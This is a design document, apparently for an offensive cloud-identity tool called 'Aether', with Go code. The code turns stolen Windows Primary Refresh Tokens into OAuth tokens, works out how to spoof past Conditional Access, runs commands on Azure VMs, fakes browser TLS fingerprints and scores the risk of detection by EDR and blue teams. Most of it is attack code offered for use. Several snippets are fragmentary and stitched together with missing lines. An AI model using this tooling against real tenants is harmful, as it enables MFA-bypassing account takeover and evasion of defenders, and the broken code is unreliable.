## 1. Philosophy & Core Principles

### 1.1 The "Impacket" Standard

Just as Impacket re-implemented Windows protocols (SMB, RPC, Kerberos) to enable offensive operations from Linux, **Aether re-implements modern identity protocols**:

| Legacy (Impacket/Mimikatz) | Modern (Aether) |
|----------------------------|-----------------|
| Kerberos TGT | Primary Refresh Token (PRT) |
| NTLM Hash | OAuth2 Refresh Token |
| SMB/RPC | Microsoft Graph API / Azure Resource Manager |
| Active Directory | Entra ID + Conditional Access |
| `psexec` | `aether exec` (cloud VM command execution) |

### 1.2 Design Principles

1. **Protocol-Level, Not Wrapper-Level** — Aether implements protocols from the specification up. It does not wrap `curl` or invoke Python scripts.
2. **Single Static Binary** — Zero runtime dependencies. One file, one job.
3. **OPSEC-First** — Every action includes risk scoring and TLS fingerprint spoofing.
4. **Extensible** — Plugin architecture for adding new identity providers and cloud APIs.
5. **Auditable** — Every decision is logged with reasoning for purple team exercises.

## 4. Module Deep-Dives

### 4.1 Module: `aether prt` — Token Forge Engine

**Purpose:** Convert stolen Windows Primary Refresh Tokens (PRTs) into usable OAuth2 access tokens for Graph API, Azure, and AWS SSO — entirely from Linux.

**Why This Matters:** A PRT is the modern equivalent of a Kerberos TGT. It's issued by Entra ID to Windows 10/11 devices and contains device + user claims. If you extract it from a compromised host, you can impersonate that device and user without their password or MFA.

**Technical Implementation:**

```go
// internal/engine/token/prt.go

package token

import (
    "crypto/rsa"
    "crypto/x509"
    "encoding/json"
    "fmt"
    "time"
    
    "github.com/AzureAD/microsoft-authentication-library-for-go/apps/public"
    "github.com/golang-jwt/jwt/v5"
)

// PRT represents a Primary Refresh Token extracted from a Windows host
type PRT struct {
    Cookie      string            // The PRT cookie value
    DeviceID    string            // Device identifier
    TenantID    string            // Entra ID tenant
    UserID      string            // User object ID
    SessionKey  []byte            // Session key for encryption
    Certificate *x509.Certificate // Device certificate (if available)
}

// PRTConverter handles PRT → OAuth token conversion
type PRTConverter struct {
    client *http.Client // Uses uTLS transport
    logger *zap.Logger
}

// ConvertPRTToOAuth takes a PRT and returns OAuth2 tokens
func (c *PRTConverter) ConvertPRTToOAuth(prt *PRT, resource string) (*OAuthTokens, error) {
    // 1. Validate the PRT structure
    if err := c.validatePRT(prt); err != nil {
        return nil, fmt.Errorf("invalid PRT: %w", err)
    }
    
    // 2. Build the MS-OAPX request (device authentication flow)
    //    Ref: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-oapx/
    req := c.buildPRTRequest(prt, resource)
    
    // 3. Send to Entra ID token endpoint with uTLS-spoofed fingerprint
    resp, err := c.client.Do(req)
    if err != nil {
        return nil, fmt.Errorf("PRT exchange failed: %w", err)
    }
    defer resp.Body.Close()
    
    // 4. Parse and return tokens
    var tokens OAuthTokens
    if err := json.NewDecoder(resp.Body).Decode(&tokens); err != nil {
        return nil, fmt.Errorf("failed to parse token response: %w", err)
    }
    
    return &tokens, nil
}

// OAuthTokens represents the token response
type OAuthTokens struct {
    AccessToken  string `json:"access_token"`
    RefreshToken string `json:"refresh_token"`
    IDToken      string `json:"id_token"`
    ExpiresIn    int    `json:"expires_in"`
    TokenType    string `json:"token_type"`
}
```

**Key Dependencies:**
- `github.com/AzureAD/microsoft-authentication-library-for-go` — MSAL Go implementation
- `github.com/golang-jwt/jwt/v5` — JWT parsing and validation
- Custom MS-OAPX implementation (reverse-engineered from Windows protocol specs)

**PRT Extraction (Input):** The user extracts the PRT cookie from a compromised Windows host using tools like `PRTextractor` or manual registry/browser dumping. They provide it to Aether as a JSON file or base64-encoded string.

### 4.3 Module: `aether cap` — Conditional Access Policy Evaluator

**Purpose:** Parse and evaluate Entra ID Conditional Access policies **offline** to determine exactly what device OS, location, browser, and client app to spoof before executing any action.

**Why This Matters:** Entra ID Conditional Access policies can block access based on device compliance, location, risk level, and more. By evaluating these policies offline, Aether can tell the operator exactly what to spoof — avoiding trial-and-error that would trigger alerts.

**Technical Implementation:**

```go
// internal/engine/cap/parser.go

package cap

import (
    "encoding/json"
    "fmt"
    
    "github.com/microsoftgraph/msgraph-sdk-go/models" // MS Graph SDK
)

// ConditionalAccessPolicy represents an Entra ID CAP
type ConditionalAccessPolicy struct {
    ID          string   `json:"id"`
    DisplayName string   `json:"displayName"`
    State       string   `json:"state"` // "enabled", "disabled", "enabledForReportingButNotEnforced"
    Conditions  Conditions `json:"conditions"`
    GrantControls GrantControls `json:"grantControls"`
}

type Conditions struct {
    Applications  ApplicationCondition `json:"applications"`
    Users         UserCondition        `json:"users"`
    Locations     LocationCondition    `json:"locations"`
    Platforms     PlatformCondition    `json:"platforms"`     // Windows, iOS, Android, macOS
    ClientApps    ClientAppCondition   `json:"clientApps"`    // Browser, Mobile, Exchange ActiveSync
    DeviceStates  DeviceStateCondition `json:"deviceStates"`  // Compliant, Domain-joined
    SignInRisk    string               `json:"signInRisk"`    // High, Medium, Low, None
    UserRisk      string               `json:"userRisk"`
}

type GrantControls struct {
    Operator          string   `json:"operator"`           // "AND", "OR"
    BuiltInControls   []string `json:"builtInControls"`    // "mfa", "compliantDevice", "domainJoinedDevice"
    CustomControls    []string `json:"customControls"`
}

// CAPEvaluator evaluates policies offline to find bypass strategies
type CAPEvaluator struct {
    policies []ConditionalAccessPolicy
}

// Evaluate returns a BypassStrategy based on policy analysis
func (e *CAPEvaluator) Evaluate(targetUser string, targetApp string) (*BypassStrategy, error) {
    var applicablePolicies []ConditionalAccessPolicy
    
    // 1. Filter policies that apply to this user + app
    for _, policy := range e.policies {
        if e.isApplicable(policy, targetUser, targetApp) {
            applicablePolicies = append(applicablePolicies, policy)
        }
    }
    
    // 2. Build the "strictest" set of requirements
    requirements := e.aggregateRequirements(applicablePolicies)
    
    // 3. Generate bypass strategy
    strategy := &BypassStrategy{
        RequiredOS:        e.determineOS(requirements),
        RequiredLocation:  e.determineLocation(requirements),
        RequiredBrowser:   e.determineBrowser(requirements),
        RequiredDeviceCompliance: requirements.DeviceCompliant,
        RiskLevel:         e.calculateRisk(requirements),
        SpoofingRecommendations: e.generateSpoofs(requirements),
    }
    
    return strategy, nil
}

// BypassStrategy tells the operator exactly what to spoof
type BypassStrategy struct {
    RequiredOS             string   // "Windows10", "iOS", "Android"
    RequiredLocation       string   // "US-East", "Europe"
    RequiredBrowser        string   // "Edge", "Chrome", "Safari"
    RequiredDeviceCompliance bool   // true if device must be compliant
    RiskLevel              int      // 0-100
    SpoofingRecommendations []string // Human-readable recommendations
}
```

**Key Dependencies:**
- `github.com/microsoftgraph/msgraph-sdk-go` — Microsoft Graph SDK for policy retrieval
- Custom policy aggregation logic

```go
    subscriptionID string
    token          *OAuthTokens

// ExecuteOnAzureVM runs a command on an Azure VM
func (e *AzureExecutor) ExecuteOnAzureVM(ctx context.Context, vmID, resourceGroup, command string) (*CommandResult, error) {
    // 1. Create credential from token
    cred := e.createTokenCredential()
    
    // 2. Initialize Azure Compute client
    client, err := armcompute.NewVirtualMachinesClient(e.subscriptionID, cred, nil)
    if err != nil {
        return nil, fmt.Errorf("failed to create Azure client: %w", err)
    }
    
    // 3. Build RunCommand request
    runCommand := &armcompute.RunCommandInput{
        CommandID: ptr.String("RunShellScript"),
        Script:    []string{command},
    }

    poller, err := client.BeginRunCommand(ctx, resourceGroup, vmID, runCommand, nil)

        return nil, fmt.Errorf("RunCommand failed: %w", err)
    }
    
    resp, err := poller.PollUntilDone(ctx, nil)
    if err != nil {
        return nil, err
    }
    
    // 5. Parse and return output
    return &CommandResult{
        Output:   *resp.Value.Message,
        ExitCode: *resp.Value.ExitCode,
```

### 4.5 Module: `aether validate` — Path Validation & OPSEC Engine

**Purpose:** Take attack paths from BloodHound/ROADtools, validate them non-destructively, and assign unified OPSEC risk scores.

**Technical Implementation:**

```go
// internal/engine/validate/path.go

package validate

import (
    "encoding/json"
    "os"
)

// AttackPath represents a path from BloodHound JSON export
type AttackPath struct {
    Nodes []PathNode `json:"nodes"`
    Edges []PathEdge `json:"edges"`
}

type PathNode struct {
    ID         string            `json:"id"`
    Label      string            `json:"label"`      // "User", "Group", "Computer", "OU"
    Properties map[string]string `json:"properties"`
}

type PathEdge struct {
    Source string `json:"source"`
    Target string `json:"target"`
    Type   string `json:"type"`   // "MemberOf", "HasSession", "AdminTo"
}

// PathValidator validates that an attack path is actually exploitable
type PathValidator struct {
    token      *OAuthTokens
    httpClient *http.Client
}

// ValidatePath checks each step in the path
func (v *PathValidator) ValidatePath(path *AttackPath) (*ValidationResult, error) {
    result := &ValidationResult{
        Steps:      []StepResult{},
        OverallRisk: 0,
        IsValid:    true,
    }
    
    for i, step := range path.Edges {
        stepResult := v.validateStep(step, path)
        result.Steps = append(result.Steps, stepResult)
        
        if !stepResult.Valid {
            result.IsValid = false
        }
        
        // Accumulate risk
        result.OverallRisk += stepResult.RiskScore
    }
    
    // Normalize risk to 0-100
    if len(result.Steps) > 0 {
        result.OverallRisk = result.OverallRisk / len(result.Steps)
    }
    
    return result, nil
}

// RiskScorer calculates OPSEC risk for an action
type RiskScorer struct {
    edrDetected    bool
    siemLogging    bool
    blueTeamActive bool
    timeOfDay      string // "business_hours", "off_hours"
}

func (r *RiskScorer) ScoreAction(action string, target string) (int, string, error) {
    baseRisk := r.getBaseRisk(action)
    
    // Adjust for environmental factors
    if r.edrDetected {
        baseRisk += 20
    }
    if r.siemLogging {
        baseRisk += 15
    }
    if r.blueTeamActive {
        baseRisk += 25
    }
    if r.timeOfDay == "business_hours" {
        baseRisk += 10
    }
    
    if baseRisk > 100 {
        baseRisk = 100
    }
    
    reasoning := fmt.Sprintf("Base risk %d + EDR(%t) + SIEM(%t) + BlueTeam(%t) + Time(%s)",
        r.getBaseRisk(action), r.edrDetected, r.siemLogging, r.blueTeamActive, r.timeOfDay)
    
    return baseRisk, reasoning, nil
}
```

```go
package transport

import (

// BrowserPreset defines which browser to impersonate
type BrowserPreset string

const (
    Chrome120 BrowserPreset = "chrome_120"
    Edge120   BrowserPreset = "edge_120"
    Firefox120 BrowserPreset = "firefox_120"
)

// NewUTLSClient creates an HTTP client with JA3/JA4 spoofing
func NewUTLSClient(preset BrowserPreset) *http.Client {
    // Create uTLS config with browser fingerprint
    var spec utls.ClientHelloSpec
    
    switch preset {
    case Chrome120:
        spec = utls.HelloChrome_120_ClientHello
    case Edge120:
        spec = utls.HelloEdge_120_ClientHello
    case Firefox120:
        spec = utls.HelloFirefox_120_ClientHello
    default:
        spec = utls.HelloChrome_120_ClientHello
    }
    
    // Build uTLS connection
    config := utls.Config{
        ClientHelloID: &utls.ClientHelloID{
            Client:  spec,
            Version: utls.VersionTLS13,
        },
        InsecureSkipVerify: false, // Never skip in production
    }
    
    // Create HTTP client with custom transport
    return &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{
                // uTLS handles the actual fingerprint
            },
            ForceAttemptHTTP2: true,
            MaxIdleConns:      100,
            IdleConnTimeout:   90 * time.Second,
        },
```

```go
package store

// Config represents Aether's configuration
type Config struct {
    // General
    LogLevel     string `json:"log_level"`      // debug, info, warn, error
    LogFile      string `json:"log_file"`       // Path to log file
    Timeout      int    `json:"timeout"`        // Default timeout in seconds
    
    // TLS Fingerprinting
    BrowserPreset string `json:"browser_preset"` // chrome, edge, firefox
    
    // OPSEC
    MaxRiskThreshold int `json:"max_risk_threshold"` // 0-100
    
    // Cloud Providers
    Azure struct {
        SubscriptionID string `json:"subscription_id"`
    } `json:"azure"`
    
    AWS struct {
        Region string `json:"region"`
    } `json:"aws"`
}

// DefaultConfig returns sensible defaults
func DefaultConfig() *Config {
    return &Config{
        LogLevel:         "info",
        Timeout:          30,
        BrowserPreset:    "chrome",
        MaxRiskThreshold: 50,
    }
}

// LoadConfig loads from file or creates default
func LoadConfig(path string) (*Config, error) {
    if path == "" {
        // Check default locations
        locations := []string{
            "./aether.json",
            os.ExpandEnv("$HOME/.config/aether/config.json"),
            "/etc/aether/config.json",
        }
        for _, loc := range locations {
            if _, err := os.Stat(loc); err == nil {
                path = loc
                break
            }
        }
    }
    
    if path == "" {
        return DefaultConfig(), nil
    }
    
    data, err := os.ReadFile(path)
    if err != nil {
        return nil, err
    }
    
    var cfg Config
    if err := json.Unmarshal(data, &cfg); err != nil {
        return nil, err
    }
    
    return &cfg, nil
}
```

### 6.4 Structured Logging with OPSEC in Mind

```go
// internal/store/log.go

package store

import (
    "os"
    
    "go.uber.org/zap"
    "go.uber.org/zap/zapcore"
)

// NewLogger creates a structured logger with OPSEC-aware formatting
func NewLogger(level string, logFile string) (*zap.Logger, error) {
    var config zap.Config
    
    if logFile != "" {
        // File logging - include full details for reporting
        config = zap.NewProductionConfig()
        config.OutputPaths = []string{logFile}
        config.ErrorOutputPaths = []string{logFile}
    } else {
        // Console logging - minimal for OPSEC (don't leak sensitive data to terminal)
        config = zap.NewDevelopmentConfig()
        config.EncoderConfig.EncodeLevel = zapcore.CapitalColorLevelEncoder
        config.OutputPaths = []string{"stderr"}
    }
    
    // Set log level
    var lvl zapcore.Level
    if err := lvl.UnmarshalText([]byte(level)); err != nil {
        lvl = zapcore.InfoLevel
    }
    config.Level = zap.NewAtomicLevelAt(lvl)
    
    // Build logger with redaction
    logger, err := config.Build()
    if err != nil {
        return nil, err
    }
    
    // Wrap with redaction for sensitive fields
    return &RedactLogger{logger: logger}, nil
}

// RedactLogger wraps zap.Logger to redact sensitive data
type RedactLogger struct {
    logger *zap.Logger
}

func (r *RedactLogger) redact(fields ...zap.Field) []zap.Field {
    // Redact tokens, passwords, etc.
    for i, field := range fields {
        if field.Key == "token" || field.Key == "password" || field.Key == "secret" {
            fields[i] = zap.String(field.Key, "[REDACTED]")
        }
    }
    return fields
}
```
